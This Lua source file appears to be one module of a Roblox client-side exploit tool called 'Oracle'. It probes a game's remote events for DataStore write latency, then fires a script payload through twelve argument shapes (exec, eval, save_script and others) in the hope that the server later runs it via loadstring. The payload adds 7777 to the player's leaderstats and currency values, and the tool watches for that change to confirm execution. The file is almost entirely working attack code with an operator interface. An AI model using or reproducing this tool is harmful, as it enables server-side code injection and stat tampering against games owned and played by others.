-- Oracle // 31_dschan.lua
-- DSCHAN — DataStore Execution Channel Probe
-- Identifies remotes that write client-controlled data to DataStore
-- Injects canary payloads and monitors for deferred server-side execution
-- Vector 1: Client → Remote → DataStore write → Server poll → loadstring()
local G      = ...
local C      = G.C
local TI     = G.TI
local mk     = G.mk
local tw     = G.tw
local corner = G.corner
local stroke = G.stroke
local pad    = G.pad
local listV  = G.listV
local listH  = G.listH
local mkRow  = G.mkRow
local mkSep  = G.mkSep
local vs     = G.vs
local snap   = G.snap
local dif    = G.dif
local hookR  = G.hookR
local rlog   = G.rlog
local CFG    = G.CFG
local CON    = G.CON
local RepS   = G.RepS
local LP     = G.LP

local RS     = game:GetService("RunService")
local Players= game:GetService("Players")

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- DSCHAN ENGINE
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- DataStore latency signature
-- Direct property changes: 5-25ms
-- Remote handler (no DS): 20-80ms
-- Remote handler (DS write): 80-400ms  ← detection window
-- Remote handler (DS read+write): 150-600ms
local DS_LATENCY_MIN  = 80    -- below this = probably no DataStore
local DS_LATENCY_SURE = 200   -- above this = almost certainly DataStore

-- Canary confirmation delta value — distinctive enough to not be coincidental
local CANARY_DELTA = 7777

-- Build a canary script string targeted at the local player
-- If evaluated server-side via loadstring, modifies player stats by +CANARY_DELTA
local function buildCanaryScript(playerName)
    return ([[
pcall(function()
    local ok,p=pcall(function()
        return game:GetService("Players")["%s"]
    end)
    if not ok or not p then return end
    local ls=p:FindFirstChild("leaderstats")
    if ls then
        for _,v in ipairs(ls:GetChildren()) do
            if v:IsA("NumberValue") or v:IsA("IntValue")
            or v:ClassName=="IntValue" or v.ClassName=="NumberValue" then
                v.Value=v.Value+%d
            end
        end
    end
    -- Also try direct stat names
    for _,name in ipairs({"Coins","Cash","Points","Kills","Score","XP","Gems","Level"}) do
        local sv=p:FindFirstChild(name)
        if sv and sv.Value~=nil then
            pcall(function() sv.Value=sv.Value+%d end)
        end
    end
end)
]]):format(playerName, CANARY_DELTA, CANARY_DELTA)
end

-- Snapshot all observable numeric player values (leaderstats, direct children)
local function snapshotPlayerValues()
    local snap2 = {}
    local function capture(parent, prefix)
        if not parent then return end
        local ok,ch=pcall(function() return parent:GetChildren() end)
        if not ok then return end
        for _,v in ipairs(ch) do
            local ok2,val=pcall(function() return v.Value end)
            if ok2 and (type(val)=="number") then
                snap2[prefix.."."..v.Name] = val
            end
        end
    end
    capture(LP:FindFirstChild("leaderstats"), "leaderstats")
    capture(LP, "player")
    return snap2
end

-- Compare two snapshots for canary-delta changes
local function detectCanary(before, after)
    local hits = {}
    for key, bval in pairs(before) do
        local aval = after[key]
        if aval and aval ~= bval then
            local delta = aval - bval
            -- Exact canary delta = confirmed execution
            -- Any large unexpected change = probable execution
            local confirmed = math.abs(delta) == CANARY_DELTA
            local suspicious = math.abs(delta) > 100
            if confirmed or suspicious then
                table.insert(hits, {
                    path      = key,
                    before    = bval,
                    after     = aval,
                    delta     = delta,
                    confirmed = confirmed,
                })
            end
        end
    end
    return hits
end

-- ── Timing-based DataStore remote detection ───────────────────────────────────
-- Fires each remote multiple times, measures latency, classifies by DS signature
local function probeForDSRemotes(remotes, samples, logFn, progressFn)
    local results = {}
    local total = #remotes * samples

    for ri, remote in ipairs(remotes) do
        local times = {}
        for s = 1, samples do
            if progressFn then
                progressFn(ri, #remotes, s, samples, remote.Name)
            end
            local t0 = tick()
            pcall(function()
                if remote:IsA("RemoteFunction") then
                    remote:InvokeServer()
                else
                    remote:FireServer()
                end
            end)
            local lat = (tick()-t0)*1000
            table.insert(times, lat)
            task.wait(0.12)
        end

        -- Compute stats
        table.sort(times)
        local med = times[math.ceil(#times/2)]
        local p95 = times[math.max(1,math.floor(#times*0.95))]
        local mx  = times[#times]

        -- Classify
        local dsLikely = med >= DS_LATENCY_MIN
        local dsSure   = med >= DS_LATENCY_SURE or p95 >= DS_LATENCY_SURE
        local label
        if dsSure then
            label = "DATASTORE_CONFIRMED"
        elseif dsLikely then
            label = "DATASTORE_PROBABLE"
        else
            label = "NO_DATASTORE"
        end

        local result = {
            name   = remote.Name,
            remote = remote,
            median = med,
            p95    = p95,
            max    = mx,
            label  = label,
            dsLikely = dsLikely,
            dsSure   = dsSure,
        }
        table.insert(results, result)

        if logFn then
            logFn(dsSure and "FINDING" or (dsLikely and "INFO" or "CLEAN"),
                ("[%s] %s — median %.0fms  p95 %.0fms"):format(
                    label, remote.Name, med, p95),
                dsSure and "DataStore write signature detected" or
                dsLikely and "Latency suggests possible DataStore access" or
                "Fast response — no DataStore signature",
                dsSure)
        end
    end

    -- Sort: DS confirmed first
    table.sort(results, function(a,b)
        if a.dsSure ~= b.dsSure then return a.dsSure end
        return a.median > b.median
    end)
    return results
end

-- ── Canary injection engine ───────────────────────────────────────────────────
-- Probes list of payloads that embed a client-controlled string
-- into a DataStore-touching remote, then monitors for deferred execution
local CANARY_PAYLOADS = {
    -- Common save/config patterns that write strings to DataStore
    {tag="save_script",    fn=function(s) return {{action="save",   script=s}} end},
    {tag="save_config",    fn=function(s) return {{action="save",   config=s}} end},
    {tag="save_data",      fn=function(s) return {{action="save",   data=s}} end},
    {tag="save_string",    fn=function(s) return {{save=s}} end},
    {tag="admin_exec",     fn=function(s) return {{action="exec",   code=s}} end},
    {tag="admin_run",      fn=function(s) return {{action="run",    script=s}} end},
    {tag="config_set",     fn=function(s) return {{action="set",    value=s, key="script"}} end},
    {tag="store_payload",  fn=function(s) return {{payload=s,       persist=true}} end},
    {tag="cross_server",   fn=function(s) return {{message=s,       broadcast=true}} end},
    {tag="raw_string",     fn=function(s) return {s} end},
    {tag="nested_code",    fn=function(s) return {{code={script=s,  eval=true}}} end},
    {tag="update_handler", fn=function(s) return {{handler=s,       update=true}} end},
}

local function injectCanary(remote, canaryScript, monitorSecs, logFn)
    local playerName = LP.Name
    local before = snapshotPlayerValues()

    if logFn then
        logFn("INFO",
            ("Injecting canary into %s"):format(remote.Name),
            ("Monitoring for %.0fs after injection"):format(monitorSecs))
    end

    -- Try each payload format
    local fired = false
    for _, payload in ipairs(CANARY_PAYLOADS) do
        task.wait(0.05)
        local args = payload.fn(canaryScript)
        local ok = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(table.unpack(args))
            else
                remote:FireServer(table.unpack(args))
            end
        end)
        if ok then
            fired = true
            if logFn then
                logFn("INFO",
                    ("Canary fired [%s] via %s"):format(payload.tag, remote.Name))
            end
        end
    end

    if not fired then
        if logFn then logFn("INFO","All canary payloads rejected by "..remote.Name) end
        return nil
    end

    -- Monitor for deferred execution
    -- DataStore poll intervals are typically 5-60 seconds
    -- Check at intervals: 1s, 3s, 5s, 10s, 20s, 30s, 60s
    local checkPoints = {1, 3, 5, 10, 15, 20, 30}
    local lastCheck   = tick()
    local deadline    = tick() + monitorSecs

    for _, delay in ipairs(checkPoints) do
        if tick() + delay > deadline then break end

        -- Wait precisely to this checkpoint
        local waitUntil = lastCheck + delay
        while tick() < waitUntil do task.wait(0.5) end
        lastCheck = tick()

        local after = snapshotPlayerValues()
        local hits  = detectCanary(before, after)

        if #hits > 0 then
            if logFn then
                for _, hit in ipairs(hits) do
                    logFn("FINDING",
                        ("CANARY EXECUTED at t+%.0fs: %s"):format(
                            delay, hit.path),
                        ("%s  %s -> %s  (delta %+d%s)"):format(
                            remote.Name,
                            tostring(hit.before),
                            tostring(hit.after),
                            hit.delta,
                            hit.confirmed and " — EXACT CANARY MATCH" or ""),
                        true)
                end
            end
            return {
                remote    = remote.Name,
                confirmed = hits[1].confirmed,
                hits      = hits,
                delayMs   = delay * 1000,
                pollChain = true,
            }
        end

        if logFn then
            logFn("INFO",
                ("t+%ds: no canary confirmation"):format(delay))
        end
    end

    if logFn then
        logFn("CLEAN",
            ("No canary execution detected on %s"):format(remote.Name),
            ("Monitored %.0fs — no stat delta matching +%d"):format(
                monitorSecs, CANARY_DELTA))
    end
    return nil
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- DSCHAN PAGE UI
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local P_DS = mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),Visible=false,ZIndex=3},CON)

-- topbar
local TOPBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,32),ZIndex=4},P_DS)
stroke(C.BORDER,1,TOPBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TOPBAR)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="DSCHAN — DATASTORE EXECUTION CHANNEL",
    TextColor3=Color3.fromRGB(255,140,40),TextSize=11,
    Size=UDim2.new(0,340,1,0),Position=UDim2.new(0,14,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},TOPBAR)
local DS_STATUS=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="idle",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(1,-354,1,0),Position=UDim2.new(0,350,0,0),
    TextXAlignment=Enum.TextXAlignment.Right,ZIndex=5},TOPBAR)

-- control bar
local CTRLBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,0,30),ZIndex=4},P_DS)
stroke(C.BORDER,1,CTRLBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=4},CTRLBAR)

local function mkCBtn(txt,col,x,w)
    local b=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=col,BorderSizePixel=0,
        Font=Enum.Font.GothamBold,Text=txt,TextColor3=Color3.fromRGB(8,8,12),TextSize=9,
        Size=UDim2.new(0,w or 0,0,22),AutomaticSize=w and Enum.AutomaticSize.None or Enum.AutomaticSize.X,
        Position=UDim2.new(0,x,0.5,-11),ZIndex=5},CTRLBAR)
    corner(5,b)
    if not w then mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)},b) end
    return b
end

local PROBE_BTN  = mkCBtn("Probe DS Remotes",  Color3.fromRGB(255,140,40),  8)
local CANARY_BTN = mkCBtn("Inject Canary",      Color3.fromRGB(255,80,80),   168)
local FULL_BTN   = mkCBtn("Full Chain Test",    Color3.fromRGB(255,200,60),  288)
local STOP_BTN   = mkCBtn("Stop",               Color3.fromRGB(60,15,15),    410)
STOP_BTN.TextColor3 = Color3.fromRGB(255,80,80)
stroke(Color3.fromRGB(255,80,80),1,STOP_BTN)

-- body
local BODY=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,62),Size=UDim2.new(1,0,1,-62),ZIndex=3},P_DS)

-- left: found remotes + canary results
local DL=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(0,240,1,0),ZIndex=3},BODY)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),ZIndex=4},DL)
local RES_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),ScrollBarThickness=3,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=4},DL)
pad(6,8,RES_SCROLL); listV(RES_SCROLL,5)

-- right: live log
local DR=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,241,0,0),Size=UDim2.new(1,-241,1,0),ZIndex=3},BODY)
local PROG_BG=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,3),ZIndex=5},DR)
local PROG_BAR=mk("Frame",{BackgroundColor3=Color3.fromRGB(255,140,40),
    BorderSizePixel=0,Size=UDim2.new(0,0,1,0),ZIndex=6},PROG_BG)
corner(2,PROG_BAR)
local LOG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,3),Size=UDim2.new(1,0,1,-3),
    ScrollBarThickness=4,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ScrollingDirection=Enum.ScrollingDirection.Y,ZIndex=4},DR)
pad(10,8,LOG_SCROLL); listV(LOG_SCROLL,3)
local LOG_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="DSCHAN hunts the DataStore execution channel.\n\n"..
         "Vector: Client fires a remote with a crafted string.\n"..
         "The server writes it to DataStore.\n"..
         "A polling script evaluates it via loadstring().\n"..
         "If the canary executes — you have deferred\n"..
         "server-side code execution through persistence.\n\n"..
         "Probe DS Remotes — find remotes with DataStore\n"..
         "latency signatures (>80ms response time).\n\n"..
         "Inject Canary — send a canary script through\n"..
         "identified remotes and monitor for execution.\n\n"..
         "Full Chain Test — runs both phases automatically.",
    TextColor3=C.MUTED,TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,200),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LOG_SCROLL)

-- ── Log helpers ───────────────────────────────────────────────────────────────
local dN=0
local function addLog(tag,msg,detail,hi)
    LOG_EMPTY.Visible=false; dN=dN+1; mkRow(tag,msg,detail,hi,LOG_SCROLL,dN)
    task.defer(function()
        LOG_SCROLL.CanvasPosition=Vector2.new(0,LOG_SCROLL.AbsoluteCanvasSize.Y)
    end)
end
local function addLogSep(txt) dN=dN+1; mkSep(txt,LOG_SCROLL,dN) end
local function clearLog()
    for _,c in ipairs(LOG_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    dN=0; LOG_EMPTY.Visible=true
    tw(PROG_BAR,TI.fast,{Size=UDim2.new(0,0,1,0)})
end

-- ── Result card builder ───────────────────────────────────────────────────────
local DS_RESULTS = {}
local SEL_REMOTE = nil  -- selected for canary injection

local COL_SURE    = Color3.fromRGB(255,80,80)
local COL_PROB    = Color3.fromRGB(255,160,40)
local COL_NONE    = Color3.fromRGB(80,140,255)
local COL_CANARY  = Color3.fromRGB(80,210,100)

local function addRemoteCard(result, ord)
    local col = result.dsSure and COL_SURE or
                result.dsLikely and COL_PROB or COL_NONE

    local card=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=C.CARD,BorderSizePixel=0,Text="",
        Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
        ZIndex=4,LayoutOrder=ord},RES_SCROLL)
    corner(6,card); stroke(col,1,card); pad(8,6,card); listV(card,4)

    local hrow=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
        Size=UDim2.new(1,0,0,16),ZIndex=5,LayoutOrder=1},card)
    listH(hrow,5)
    local badge=mk("Frame",{BackgroundColor3=col,BorderSizePixel=0,
        Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=6},hrow)
    corner(3,badge); mk("UIPadding",{PaddingLeft=UDim.new(0,4),PaddingRight=UDim.new(0,4)},badge)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=result.label:gsub("_"," "),TextColor3=Color3.fromRGB(8,8,12),TextSize=7,
        Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=7},badge)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=result.name,TextColor3=col,TextSize=10,
        Size=UDim2.new(1,-90,1,0),TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=6,LayoutOrder=2},hrow)

    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
        Text=("median %.0fms  p95 %.0fms"):format(result.median, result.p95),
        TextColor3=C.MUTED,TextSize=9,
        Size=UDim2.new(1,0,0,12),TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=5,LayoutOrder=2},card)

    -- Canary result overlay if present
    if result.canaryResult then
        local cr=result.canaryResult
        local crLabel=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=cr.confirmed and "CANARY EXECUTED" or "CANARY: stat change detected",
            TextColor3=COL_CANARY,TextSize=9,
            Size=UDim2.new(1,0,0,12),TextXAlignment=Enum.TextXAlignment.Left,
            ZIndex=5,LayoutOrder=3},card)
    end

    -- Click to select for canary injection
    card.MouseButton1Click:Connect(function()
        SEL_REMOTE = result
        card.BackgroundColor3 = Color3.fromRGB(18,14,6)
        DS_STATUS.Text = "selected: "..result.name
        DS_STATUS.TextColor3 = Color3.fromRGB(255,140,40)
    end)
end

-- ── State ─────────────────────────────────────────────────────────────────────
local running   = false
local aborted   = false

STOP_BTN.MouseButton1Click:Connect(function()
    aborted = true
    DS_STATUS.Text = "stopped"
    DS_STATUS.TextColor3 = C.MUTED
end)

-- ── Collect remotes ───────────────────────────────────────────────────────────
local function collectRemotes(limit)
    local remotes = {}
    local map = G.DISCOVERY_MAP
    if map then
        for _,r in ipairs(map.remoteEvents or {}) do
            if r.instance then table.insert(remotes,r.instance) end
        end
        for _,r in ipairs(map.remoteFunctions or {}) do
            if r.instance then table.insert(remotes,r.instance) end
        end
    end
    if #remotes == 0 then
        local function sc(root)
            local ok,d=pcall(function() return root:GetDescendants() end)
            if not ok then return end
            for _,x in ipairs(d) do
                if x:IsA("RemoteEvent") or x:IsA("RemoteFunction") then
                    table.insert(remotes,x)
                end
            end
        end
        sc(RepS); sc(workspace)
    end
    if limit then
        local cut={}
        for i=1,math.min(limit,#remotes) do table.insert(cut,remotes[i]) end
        return cut
    end
    return remotes
end

-- ── PROBE DS REMOTES ──────────────────────────────────────────────────────────
PROBE_BTN.MouseButton1Click:Connect(function()
    if running then return end
    running=true; aborted=false
    clearLog()
    DS_RESULTS={}
    for _,c in ipairs(RES_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    tw(PROBE_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,50,10)})
    DS_STATUS.Text="probing..."; DS_STATUS.TextColor3=Color3.fromRGB(255,140,40)

    local remotes = collectRemotes(16)
    addLogSep(("DS PROBE — %d remotes x 3 samples"):format(#remotes))
    addLog("INFO",
        ("Latency threshold: >%.0fms probable  >%.0fms confirmed"):format(
            DS_LATENCY_MIN, DS_LATENCY_SURE))

    task.spawn(function()
        local results = probeForDSRemotes(remotes, 3, addLog,
            function(ri, total, s, samples, name)
                if aborted then return end
                local pct = ((ri-1)*3 + s) / (total*3)
                tw(PROG_BAR,TI.fast,{Size=UDim2.new(pct,0,1,0)})
                DS_STATUS.Text=("remote %d/%d: %s [%d/%d]"):format(ri,total,name,s,samples)
            end)

        DS_RESULTS = results
        local dsCount = 0
        for i,r in ipairs(results) do
            if r.dsLikely then dsCount=dsCount+1 end
            addRemoteCard(r, i)
        end

        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        addLogSep(("PROBE COMPLETE — %d/%d DataStore signature(s)"):format(
            dsCount, #results))
        DS_STATUS.Text=dsCount.." DS remote(s) found"
        DS_STATUS.TextColor3=dsCount>0 and Color3.fromRGB(255,140,40) or C.MUTED
        tw(PROBE_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,140,40)})
        running=false
    end)
end)

-- ── INJECT CANARY ─────────────────────────────────────────────────────────────
CANARY_BTN.MouseButton1Click:Connect(function()
    if running then return end

    -- Pick target: selected remote, or first DS-likely remote from results
    local target = SEL_REMOTE
    if not target then
        for _,r in ipairs(DS_RESULTS) do
            if r.dsLikely then target=r; break end
        end
    end
    if not target then
        addLog("INFO","No DataStore remote selected",
            "Run Probe DS Remotes first, then click a result to select it")
        return
    end

    running=true; aborted=false
    tw(CANARY_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,20,20)})
    DS_STATUS.Text="injecting canary..."; DS_STATUS.TextColor3=Color3.fromRGB(255,80,80)

    addLogSep("CANARY INJECTION — "..target.name)
    addLog("INFO","Building canary script",
        ("Player: %s  Delta marker: +%d"):format(LP.Name, CANARY_DELTA))

    local canary = buildCanaryScript(LP.Name)
    addLog("INFO","Canary script built",
        ("Length: %d chars  Payloads: %d"):format(#canary, #CANARY_PAYLOADS))

    task.spawn(function()
        local result = injectCanary(target.remote, canary, 60, addLog)

        if result then
            target.canaryResult = result
            -- Rebuild card with canary overlay
            for _,c in ipairs(RES_SCROLL:GetChildren()) do
                if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
            end
            for i,r in ipairs(DS_RESULTS) do addRemoteCard(r,i) end

            addLogSep("CANARY CONFIRMED — DATASTORE EXECUTION CHANNEL FOUND")
            addLog("FINDING",
                ("Vector 1 confirmed on: %s"):format(target.name),
                ("Execution delay: %dms  Stat delta: confirmed"):format(
                    result.delayMs),
                true)

            DS_STATUS.Text="EXECUTION CONFIRMED"
            DS_STATUS.TextColor3=COL_CANARY
        else
            DS_STATUS.Text="no execution detected"
            DS_STATUS.TextColor3=C.MUTED
        end

        tw(CANARY_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,80,80)})
        running=false
    end)
end)

-- ── FULL CHAIN TEST ───────────────────────────────────────────────────────────
FULL_BTN.MouseButton1Click:Connect(function()
    if running then return end
    running=true; aborted=false
    clearLog()
    DS_RESULTS={}
    for _,c in ipairs(RES_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,60,10)})
    DS_STATUS.Text="full chain test..."; DS_STATUS.TextColor3=Color3.fromRGB(255,200,60)

    local remotes = collectRemotes(12)
    addLogSep(("FULL CHAIN TEST — %d remotes"):format(#remotes))

    task.spawn(function()
        -- Phase 1: identify DS remotes
        addLog("INFO","Phase 1: DataStore latency probe")
        local probeResults = probeForDSRemotes(remotes, 3, addLog, function(ri,tot,s,samp,name)
            if aborted then return end
            local pct = ((ri-1)*3+s)/(tot*3) * 0.4  -- first 40% of bar
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(pct,0,1,0)})
            DS_STATUS.Text=("phase 1: %s"):format(name)
        end)
        DS_RESULTS = probeResults

        local dsRemotes = {}
        for _,r in ipairs(probeResults) do
            if r.dsLikely then table.insert(dsRemotes, r) end
            addRemoteCard(r, #dsRemotes)
        end

        if #dsRemotes == 0 then
            addLog("CLEAN","No DataStore remotes detected",
                "No remotes show DataStore latency signature in this game")
            addLogSep("CHAIN TEST COMPLETE — No DS channel found")
            DS_STATUS.Text="no DS remotes detected"
            DS_STATUS.TextColor3=C.MUTED
            tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,200,60)})
            running=false; return
        end

        addLog("INFO",
            ("Phase 1 complete: %d DS remote(s) — proceeding to canary"):format(
                #dsRemotes))
        task.wait(1)

        -- Phase 2: inject canary into each DS remote
        addLogSep(("Phase 2: Canary injection into %d remote(s)"):format(#dsRemotes))
        local canary = buildCanaryScript(LP.Name)

        for i, target in ipairs(dsRemotes) do
            if aborted then break end
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(0.4 + (i/#dsRemotes)*0.6, 0,1,0)})
            DS_STATUS.Text=("phase 2: injecting into %s"):format(target.name)

            addLog("INFO",("Canary attempt %d/%d: %s"):format(i,#dsRemotes,target.name))
            local result = injectCanary(target.remote, canary, 30, addLog)

            if result then
                target.canaryResult = result
                -- Rebuild cards
                for _,c in ipairs(RES_SCROLL:GetChildren()) do
                    if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
                end
                for j,r in ipairs(DS_RESULTS) do addRemoteCard(r,j) end

                addLogSep("VECTOR 1 CONFIRMED")
                addLog("FINDING",
                    "DataStore Execution Channel Found",
                    ("Remote: %s  Delay: %dms  Execution: %s"):format(
                        target.name,
                        result.delayMs,
                        result.confirmed and "EXACT CANARY" or "STAT CHANGE"),
                    true)

                DS_STATUS.Text="VECTOR 1 CONFIRMED"
                DS_STATUS.TextColor3=COL_CANARY
                break
            end

            task.wait(0.5)
        end

        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        if not aborted then
            addLogSep("FULL CHAIN TEST COMPLETE")
        end
        tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,200,60)})
        running=false
    end)
end)

-- Export
G.DSCHAN_RESULTS   = DS_RESULTS
G.dschan_buildCanary = buildCanaryScript
G.dschan_snapshot  = snapshotPlayerValues
G.dschan_detectCanary = detectCanary

if G.addTab then
    G.addTab("dschan","DSCHAN",P_DS)
else
    warn("[Oracle] G.addTab not found")
end
